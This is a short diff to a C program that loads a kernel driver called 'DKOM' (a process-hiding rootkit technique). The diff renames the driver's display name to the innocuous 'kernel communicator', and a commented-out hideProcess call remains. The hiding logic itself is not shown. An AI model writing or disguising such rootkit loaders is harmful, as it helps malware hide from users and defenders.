@@ -26,7 +26,7 @@ int main(int argc, char *argv[])
 	//	printf("Not enougth arguments");
 	//else
 	char* driverName = "DKOM";
-	char* displayName = "DKOM"; // TODO: put friendly name
+	char* displayName = "kernel communicator"; // TODO: put friendly name
 	if (loadSysFile(driverName, displayName))//"friendly driver"))//argv[1]);
 		printf("success");//hideProcess(driverName, 4); //(int)argv[1]);
 	else
